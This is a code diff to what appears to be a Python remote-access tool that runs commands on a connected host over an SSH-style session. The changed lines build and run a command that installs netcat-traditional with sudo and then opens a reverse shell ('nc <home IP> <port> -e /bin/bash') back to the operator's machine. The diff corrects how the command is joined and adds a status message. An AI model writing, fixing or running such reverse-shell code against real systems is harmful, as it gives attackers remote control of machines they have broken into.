@@ -19,7 +19,10 @@ def exe_terminal(host=host):
     if choose == "2":
         port = input("Enter the Port that you wanna listen on: ")
         urhost = input("Enter your home's IP: ")
-        cmd = ("sudo apt update && sudo apt install netcat-traditional -y" + f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
+        print("Installing netcat-traditional and starting reverse shell...")
+        cmd = ("sudo apt update &&" 
+        " sudo apt install netcat-traditional -y &&"
+          f"nc {urhost} {port} -e /bin/bash") #Comando para instalar o netcat-traditional e criar a conexão reversa
         stdin, stdout, stderr = c.exec_command(cmd)
         print(stdout.read().decode())
         err = stderr.read().decode()
